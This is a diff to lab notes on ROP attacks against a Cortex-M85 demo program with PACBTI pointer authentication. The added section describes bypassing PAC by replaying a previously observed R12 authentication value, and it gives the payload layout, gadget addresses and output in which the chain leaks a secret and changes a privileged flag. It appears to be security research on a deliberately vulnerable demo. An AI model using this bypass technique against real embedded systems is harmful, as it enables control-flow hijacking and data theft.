@@ -87,7 +87,7 @@
      */
 ```
 
-## With PAC Test 1
+## With PAC Test of trival ROP attack
 
 ### Output
 
@@ -167,6 +167,12 @@ LR: 0x020037e5
 SP: 0x22007670
 R12: 0x41414141
 ```
+
+![alt text](image-6.png)
+
+It doesn't alert any fault, then it still jumps to another gadget.
+The flag is not changed, only because after using PACBTI, one more value is pushed on stack and the offset skip the first gadget.
+
 
 ### Why there is **Stack Layout Shift (4-byte offset change)**
    - **Without PACBTI**: Prologue = `PUSH {r4-r6, lr}` (+16 bytes) + `SUB sp, #0x14` for locals.
@@ -269,10 +275,7 @@ SCB_CFSR_UFSR:0x02 INVSTATE
 Even though it doesn't explicitly say the program violates PAC, but the fact that
 it doesn't bypass `AUT` is clear.
 
-
-
-
-### Other potential solutions(TODO):
+#### Other potential solutions(TODO):
 
 1. **Enable PAC and BTI in Code**:
    - Add startup code (e.g., in SystemInit or main) to set the enables:
@@ -368,6 +371,87 @@ __STATIC_FORCEINLINE void __get_PAC_KEY_P (uint32_t* pPacKey) {
    - In Project Options > Debug > Use Simulator, ensure the device is set to Cortex-M85 with PACBTI (check Parameter File if needed).
    - If using hardware (e.g., ULINKpro), confirm the board supports M85 with PACBTI; simulation might need "--cpu Cortex-M85" in command-line debug.
    - In debug session, use System Viewer > CPU to monitor CONTROL bits and keys—set breakpoints after enables to verify.
+
+## With PAC Test - Fake R12
+
+Try to find some the patterns - because it is not real randomization
+
+#### Logs
+
+Normal:
+
+line 1 PACBTI:
+
+LR: 0x02003957
+SP: 0x22007670
+
+Then R12 - FEF778AE
+
+
+ROP:
+line 1:
+
+LR: 02003AB1
+SP: 0x22007670
+
+Then R12 - 0x741e09d4
+
+This is the same as the last time computation - code reuse attack
+
+So, the new ROP attack is clear that:
+
+#### Fake R12
+
+Because the r12 is pushed first to the stack
+
+```
+0x0200A860 B005      ADD      sp,sp,#0x14
+0x0200A862 F85DCB04  POP      {r12}
+0x0200A866 E8BD4070  POP      {r4-r6,lr}
+0x0200A86A F3AF802D  AUT      r12,lr,sp
+0x0200A86E 4770      BX       lr
+```
+
+so we need a new payload as: `'A' * 16 + '0x741e09d4' + 'A' * 12 + ROP chain`,
+with little endian, so the '0x741e09d4' should be put as 'd4 09 e0 74'.
+
+#### Output
+
+```
+=== DEMO 3: ROP Attack (with PAC - Fake R12) ===
+[ATTACK] Preparing ROP chain...
+
+[ATTACK] ROP Chain:
+  [0] gadget_set_flag:     0x02003805
+  [1] gadget_leak_secret:  0x020037CD
+  [2] gadget_dangerous_op: 0x02003715
+  [3] gadget_exit:         0x02003755
+
+[ATTACK] Payload structure:
+  Bytes [00-15]: Buffer (16 bytes)
+  Bytes [16-19]: Overwrite r12
+  Bytes [20-23]: Overwrite r4
+  Bytes [24-27]: Overwrite r5
+  Bytes [28-31]: Overwrite r6
+  Bytes [32-35]: Overwrite pc with gadget_set_flag
+  Bytes [36-39]: gadget_leak_secret
+  Bytes [40-43]: gadget_dangerous_op
+  Bytes [44-47]: gadget_exit
+
+[ATTACK] Launching attack...
+================================================
+
+[VULN] Executing memcpy (48 bytes)...
+[VULN] Buffer at: 0x2200764C
+[VULN] Overflow complete, returning...
+
+[GADGET] Secret leaked: 0x12345678
+[GADGET] Executing dangerous operation!
+[GADGET] ROP chain completed. Changed privileged flag: 0xDEADBEEF
+```
+
+The ROP successed!
+
 
 
 
